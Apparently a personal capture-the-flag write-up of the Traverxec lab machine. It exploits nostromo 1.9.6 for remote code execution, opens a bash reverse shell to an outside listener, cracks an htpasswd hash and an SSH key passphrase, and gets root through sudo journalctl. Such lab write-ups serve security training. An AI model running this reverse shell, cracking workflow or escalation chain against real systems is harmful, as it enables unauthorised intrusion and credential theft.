1,Recon
port scan 
	22/tcp ssh `OpenSSH 7.9p1 Debian 10+deb10u1`
	80/tcp http `tcpwrapped http-server-header: nostromo 1.9.6`
We have the version of this service, so we can check it from exploit-db
`nostromo 1.9.6 - Remote Code Execution`
Very lucky, the best vulnerability for us.
`https://github.com/AnubisSec/CVE-2019-16278.git`
```
python3 nostroSploit.py 10.10.10.165 80                                                             
[+] Connecting to target
[+] Sending malicious payload
HTTP/1.1 200 OK
Date: Sat, 21 Sep 2024 10:44:40 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Then we just need to upload the reverse shell and handle it.
```
python3 nostroSploit.py 10.10.10.165 80 "bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'"

nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.165] 59646
bash: cannot set terminal process group (1048): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$
```

Then we need to make a stable shell for us
```
upgrade to PTY
python3 -c 'import pty;pty.spawn("bash")'
^Z
stty raw -echo; fg
```

Let's enumerate the useful credit to get the user shell.
```
david:x:1000:1000:david,,,:/home/david:/bin/bash
```
By enumerate the file system, we can find a config file `/var/nostromo/conf/nhttpd.conf` and it gives the `htpasswd` position
```
# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www

/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
Then we can crack it by hashcat:
`hashcat david.hash --user -m 500 /usr/share/wordlists/rockyou.txt`
then we get the password `Nowonly4me`
But we can not use this password to switch david.
The last two options jumped out as interesting. Looking at the man page for nostromo, I see the section about HOMEDIRS:
```
HOMEDIRS
  To serve the home directories of your users via HTTP, enable the homedirs
  option by defining the path in where the home directories are stored,
  normally /home.  To access a users home directory enter a ~ in the URL
  followed by the home directory name like in this example:

        http://www.nazgul.ch/~hacki/

  The content of the home directory is handled exactly the same way as a
  directory in your document root.  If some users don't want that their
  home directory can be accessed via HTTP, they shall remove the world
  readable flag on their home directory and a caller will receive a 403
  Forbidden response.  Also, if basic authentication is enabled, a user can
  create an .htaccess file in his home directory and a caller will need to
  authenticate.

  You can restrict the access within the home directories to a single sub
  directory by defining it via the homedirs_public option.
```

So /homedirs /home points nostromo to the home directories, and then in a users directory, the webroot will be public_www. So http://10.10.10.165/~david will be /home/david/public_www.

I could even use the traversal vulnerability to explore in david’s home directory. Tried a bunch of stuff:
![[Pasted image 20240921071613.png]]

The last test was where it occurred to me that www-data must be able read in this directory, /home/david/public_www. So I went back to my shell, and not only can I get into the directory, but there’s a folder there:
```
www-data@traverxec:/home/david/public_www$ ls -al
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area

And I found the backup-ssh-identity-files.tgz from protected-file-area.
```

If we want to check the file by using `curl` 
```
curl 10.10.10.165/~david/protected-file-area/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>401 Unauthorized</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
</head>
<body>

<h1>401 Unauthorized</h1>

<hr>
<address>nostromo 1.9.6 at 10.10.10.165 Port 80</address>
</body>
</html>
```

Remember we have the password before, so let's try it again.
```
curl http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Index of /david/public_www/protected-file-area/</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
</head>
<body>

<h1>Index of /david/public_www/protected-file-area/</h1>
<hr>
<table cellpadding=2 cellspacing=5>
<tr><td><b>Type</b></td><td><b>Filename</b></td><td><b>Last Modified</b></td><td><b>Size</b></td></tr>
<tr><td><img src="/icons/file.gif" alt="icon"></td><td><a href="backup-ssh-identity-files.tgz">backup-ssh-identity-files.tgz</a></td><td>Fri, 25 Oct 2019 17:02:59 EDT</td><td>1915</td></tr>
</table>
<hr>
<address>nostromo 1.9.6 at 10.10.10.165 Port 80</address>
</body>
</html> 
```

That means we successfully login.
`wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz`
Then we can get the backup file and we get the `id_rsa` but sadly we still need to crack the `passphrase`.
```
ssh2john id_rsa > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)     
1g 0:00:00:00 DONE (2024-09-21 07:28) 100.0g/s 14400p/s 14400c/s 14400C/s carolina..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Then we can `hunter` and we successfully login to david shell.

3, shell as root
When we want to check `sudo -l` , it needs us the password of david. But we did not get the right one.
So I would choose another way: upload `pspy64` and check the interesting process.
Very sadly, there is nothing in the background.
Then i would check the `~/david/bin/server-stats.sh`
```
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

There is `/usr/bin/sudo` then i would also check the id
```
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

I’ll look up journalctrl on gtfobins, and there is a sudo option. It’s quite short, simply saying:
`sudo journalctl !/bin/sh `

The trick here is that journalctrl will output to stdout if it can fit onto the current page, but into less if it can’t. Since I’m running it with -n 5, that means only five lines come out, so I need to shrink my terminal to smaller than 5 lines, and I’ll get sent into less, still as root.

I’ll start with a small terminal, and run the command as I can as root:
![[Pasted image 20240921074723.png]]
Then we can get shell as root.
This is very tricky and funny/